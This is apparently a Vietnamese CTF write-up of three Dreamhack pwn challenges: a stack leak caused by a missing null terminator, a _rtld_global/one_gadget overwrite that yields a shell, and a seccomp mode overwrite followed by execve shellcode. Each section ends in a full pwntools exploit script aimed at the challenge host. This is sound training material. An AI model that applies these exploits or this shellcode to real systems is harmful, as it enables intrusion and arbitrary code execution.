# memory_leakage

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

FILE *fp;

struct my_page {
	char name[16];
	int age;
};

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
	struct my_page my_page;
	char flag_buf[56];
	int idx;

	memset(flag_buf, 0, sizeof(flag_buf));

	initialize();

	while(1) {
		printf("1. Join\n");
		printf("2. Print information\n");
		printf("3. GIVE ME FLAG!\n");
		printf("> ");
		scanf("%d", &idx);
		switch(idx) {
			case 1:
				printf("Name: ");
				read(0, my_page.name, sizeof(my_page.name));

				printf("Age: ");
				scanf("%d", &my_page.age);
				break;
			case 2:
				printf("Name: %s\n", my_page.name);
				printf("Age: %d\n", my_page.age);
				break;
			case 3:
				fp = fopen("/flag", "r");
				fread(flag_buf, 1, 56, fp);
				break;
			default:
				break;
		}
	}

}
```

## Ý tưởng

- Ở đây ta thấy chương trình mở một file `/flag` khác với thông thường là `flag.txt hay flag`, do đó ta cần phải tạo file `/flag`, nhưng vì nếu tạo bằng tay thì không được phép đặt `/flag` nên ta sẽ dùng một số lệnh như sau

```
touch /flag
echo "This is the content of the flag file." > /flag
```

- Thứ nhất, ta chú ý ở option 1, `read(0, my_page.name, sizeof(my_page.name));`, hàm read không tự động thêm null byte đằng sau. Ví dụ ta nhập 15 kí tự thì kí tự thứ 16 đã là 0x00 từ trước nên khi in ra nó sẽ chỉ in ra đến 0x00.
- Thứ hai, ở option 2 nó sẽ in ra `Name và Age` ở option 1
- Ta sẽ ida để kiểm tra một số thứ:
  ![image](https://user-images.githubusercontent.com/111769169/231412702-cc4426e8-78a2-4c6d-86ff-7b391ffe993d.png)
- Đầu tiên ta chú ý địa chỉ của `name, age, flag`, 3 địa chỉ khá là gần nhau, từ name đến age là 16byte, age đến flag là 4 byte
- Vậy nếu như ta có thể sử dụng `%s` ở option 2 đang trỏ đến `name`bằng một cách nào đó chỉ cần `name` và `age` nó không có byte null nào thì nó có thể in nối vào `flag`

## Khai thác

- Đầu tiên ta thấy ở option 1, `read(0, my_page.name, sizeof(my_page.name));` cho phép ta nhập vào tối đa 16 kí tự, ta sẽ nhập đủ 16 kí tự, để trong 16 byte của `name` không chứa byte 0x00
- Tiếp đến age, đầu vào là `%d` (4byte) nên ta sẽ sử dụng số hex sao cho 4byte age không chưa byte 0x00
  Ví dụ: - Trước khi nhập giá trị cho biến `age` thì age trong stack có thể là `0x00000000` - 0x123456 (có 3 byte nhưng được chương trình cấp 4 byte vậy thì nó sẽ biểu diễn trong stack là 0x00123456 - là đã chứa byte 0x00) (do 0x00 có sẵn trong stack) - 0x12345678 ( ta sài đủ 4byte, ghi đè các byte `0x00000000`)

```python
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Name: ", b"a" * 16)
p.sendlineafter(b"Age: ", str(int(0x12345678)))
```

- Tiếp theo thì ta cần đưa flag vào stack = option 3, khi chọn option 3 nó không trả về cho ta flag vì không có gì để in flag, chỉ đưa flag vào stack

```python
p.sendlineafter(b"> ", b'3')
```

- Cuối tùng ta chọn option 2 để in flag ra

```python
p.sendlineafter(b"> ", b'2')
```

## Kết quả

> hơi mất chữ D =))
> ![image](https://user-images.githubusercontent.com/111769169/231419929-e7d019b3-bf08-472e-bcf2-eb43935f9bd2.png)

```python
import sys
from pwn import *

p = remote("host3.dreamhack.games", 21018)

p.sendlineafter(b"> ", b'1')
p.sendlineafter(b"Name: ", b"a" * 16)
p.sendlineafter(b"Age: ", str(int(0x12345678)))

p.sendlineafter(b"> ", b'3')

p.sendlineafter(b"> ", b'2')

p.interactive()
```

# rtld

## Source

```c
// gcc -o rtld rtld.c -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}
```

## Ý tưởng

- Ở đây chương trình có chức năng trỏ đến một địa chỉ và thay đổi giá trị của địa chỉ đó
- Hint của bài này là dạng ` _rtld_global Overwrite`
- Theo gpt, `_rtld_global` là một biến toàn cục trong hệ thống động liên kết (dynamic linker) của Linux. Biến này được sử dụng bởi dynamic linker để cho phép các tiến trình sử dụng các phiên bản của các thư viện được nạp vào một cách động.
- Để nhận biết có `_rtld_global` ta chú ý:
- `_GI_exit` có chức năng là `_run_exit_handlers`
  ![image](https://user-images.githubusercontent.com/111769169/231476857-003bfcc4-8550-4855-b420-a83a36f7de96.png)

- Thì ý tưởng của bài này ta sẽ lợi dụng chức năng thay đổi giá trị của địa chỉ ta, sẽ thay đổi `_GI_exit` mà cụ thể là `_dl_rtld_lock_recursive` có chức năng thực thi
- Tạm hiểu nó có chức năng tương tự saved rip, vậy nếu ta có thể, ta sẽ đưa nó về hàm get_shell()

## Khai thác

- Trước hết ta sẽ phải patch file libc với file binary
- Nếu trong lúc pwninit có lỗi thì nên update lên bản 3.3.0 vì có thể 3.2.0 đã cũ.
- Em đã cập nhật lên 3.3.0 thì có thể patch được

- Chương trình leak cho ta địa chỉ, thông qua địa chỉ ta có thể tính được libc_base, ld_base và `_rtld_global`

```python
    r.recvuntil(b"stdout: ")
    libc_leak = int(r.recvline(keepends=False), 16)
    libc.address = libc_leak - 0x3c5620
    log.info("libc base: " + hex(libc.address))

    ld.address = libc.address + 0x3ca000
    log.info("_rtld_global: " + hex(ld.sym['_rtld_global']))
```

- Tiếp đến ta tìm offset của `_dl_rtld_lock_recursive` so với `_rtld_global` là 3848
  ![image](https://user-images.githubusercontent.com/111769169/231479341-500bcb29-0a6a-458a-8bd8-510634b898f8.png)

```python
    # _dl_load_lock = ld.sym['_rtld_global'] + 2312
    _dl_rtld_lock_recursive = ld.sym['_rtld_global'] + 3848
    log.info("_dl_rtld_lock_recursive: " + hex(ld.sym['_rtld_global'] + 3848))
```

- Như trên, chức năng của `_dl_rtld_lock_recursive` gần giống với saved rip nên ta chỉ cần đưa địa chỉ hàm getshell(), tuy nhiên ta không thể tính được địa chỉ hàm getshell() do địa chỉ động, cũng như không thể leak được địa chỉ nào để có thể tính exe_base. Nhưng ta có libc thì ta có one_gadget bằng cách thử hết các gadget thì ta đã có thể chiếm được shell

```python
    r.sendlineafter(b"addr: ", str((_dl_rtld_lock_recursive)))
    r.sendlineafter(b"value: ", str(libc.address  + one_gadget))
```

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/231483098-0a155e81-b694-421d-a7da-ca8e147ccabf.png)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rtld_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*main+184
                   c
                   ''')
        input()
    else:
        r = remote("host3.dreamhack.games", 19876)

    return r


def main():
    r = conn()
    one_gadget = 0xf1147

    r.recvuntil(b"stdout: ")
    libc_leak = int(r.recvline(keepends=False), 16)
    libc.address = libc_leak - 0x3c5620
    log.info("libc base: " + hex(libc.address))

    ld.address = libc.address + 0x3ca000
    log.info("_rtld_global: " + hex(ld.sym['_rtld_global']))

    # _dl_load_lock = ld.sym['_rtld_global'] + 2312
    _dl_rtld_lock_recursive = ld.sym['_rtld_global'] + 3848
    log.info("_rtld_global: " + hex(ld.sym['_rtld_global'] + 3848))

    r.sendlineafter(b"addr: ", str((_dl_rtld_lock_recursive)))
    r.sendlineafter(b"value: ", str(libc.address  + one_gadget))

    r.interactive()


if __name__ == "__main__":
    main()
```

# seccomp

## source

```c
// gcc -o seccomp seccomp.cq
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stddef.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/unistd.h>
#include <linux/audit.h>
#include <sys/mman.h>

int mode = SECCOMP_MODE_STRICT;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int syscall_filter() {
    #define syscall_nr (offsetof(struct seccomp_data, nr))
    #define arch_nr (offsetof(struct seccomp_data, arch))

    /* architecture x86_64 */
    #define REG_SYSCALL REG_RAX
    #define ARCH_NR AUDIT_ARCH_X86_64
    struct sock_filter filter[] = {
        /* Validate architecture. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
        BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
        BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
        /* Get system call number. */
        BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
        };

    struct sock_fprog prog = {
    .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])),
    .filter = filter,
        };
    if ( prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1 ) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)\n");
        return -1;
        }

    if ( prctl(PR_SET_SECCOMP, mode, &prog) == -1 ) {
        perror("Seccomp filter error\n");
        return -1;
        }
    return 0;
}


int main(int argc, char* argv[])
{
    void (*sc)();
    unsigned char *shellcode;
    int cnt = 0;
    int idx;
    long addr;
    long value;

    initialize();

    shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    while(1) {
        printf("1. Read shellcode\n");
        printf("2. Execute shellcode\n");
        printf("3. Write address\n");
        printf("> ");

        scanf("%d", &idx);

        switch(idx) {
            case 1:
                if(cnt != 0) {
                    exit(0);
                }

                syscall_filter();
                printf("shellcode: ");
                read(0, shellcode, 1024);
                cnt++;
                break;
            case 2:
                sc = (void *)shellcode;
                sc();
                break;
            case 3:
                printf("addr: ");
                scanf("%ld", &addr);
                printf("value: ");
                scanf("%ld", addr);
                break;
            default:
                break;
        }
    }
    return 0;
}
```

## Ý tưởng

- Ở đây ta có kiến thức mới là `Seccomp Filter Bypass`
- Seccomp là một cơ chế bảo mật trong Linux kernel cho phép hạn chế các hành động mà một quá trình có thể thực hiện bằng cách giới hạn các system call mà nó có thể gọi. Seccomp filter là một chương trình cấu hình để thiết lập các quy tắc để kiểm soát các system call mà một chương trình có thể gọi. => tạm hiểu là chế độ bảo vệ hạn chế một số các syscall
- Trong seccomp có 2 chế độ là `STRICT_MODE` và
  - Khi `STRICT_MODE` được kích hoạt, các system call sẽ bị giới hạn chỉ cho phép các system call cần thiết để chương trình hoạt động, đồng thời loại bỏ các system call không an toàn hoặc không cần thiết. Trong chương trình này, `STRICT_MODE` cho phép các syscall là `read, write, exit, sigreturn`
  - `FILTER_MODE` trong seccomp là một chế độ bảo vệ tương tự như STRICT_MODE, nhưng nó cho phép người dùng tùy chỉnh danh sách các system call được phép hoạt động. Thông qua `prctl` và `sock_fprog`
- Chức năng của chương trình là viết, thực thi shellcode và thay đổi giái trị của 1 địa chỉ
- Ta thấy chương trình này có sử dụng `int mode = SECCOMP_MODE_STRICT;`
- Vậy nếu ta đổi value của mode thành 2, nghĩa là chuyển từ chế độ `strict` sang `filter` thì có thể thực thi các syscall không được phép của `strict` (`filter` không gắt như `strict`)

## Khai thác

- Ta sẽ dùng chức năng 3 để thay đổi chế độ của seccomp

```python
SECCOMP_MODE_DISABLED = 0
SECCOMP_MODE_STRICT = 1
SECCOMP_MODE_FILTER = 2


mode = 0x602090

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ',b'0')
```

- Và ta tạo shell, em sử dụng lại shell của bài `shell basic`

```python
shellcode = asm('''
                    mov rax, 0x3b
                    mov rdi, 29400045130965551
                    push rdi

                    mov rdi, rsp
                    xor rsi, rsi
                    xor rdx, rdx

                    syscall
                ''', arch = 'amd64')
# ta có thể dùng pwntool
# shellcode = asm(shellcraft.sh())
```

- Và chọn option 2

## Kết quả

![image](https://user-images.githubusercontent.com/111769169/231638343-b9ca57e2-2630-4dbe-988e-5960209032f5.png)

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./seccomp',checksec=False)

# p = process(exe.path)
p = remote("host3.dreamhack.games", 23236)

mode = 0x602090
shellcode = asm('''
                    mov rax, 0x3b
                    mov rdi, 29400045130965551
                    push rdi

                    mov rdi, rsp
                    xor rsi, rsi
                    xor rdx, rdx

                    syscall
                ''', arch = 'amd64')

p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'addr: ', str(mode))
p.sendlineafter(b'value: ',b'2')

p.sendlineafter(b'> ',b'1')
p.sendafter(b'shellcode: ', shellcode)

p.sendlineafter(b'> ',b'2')

p.interactive()
```
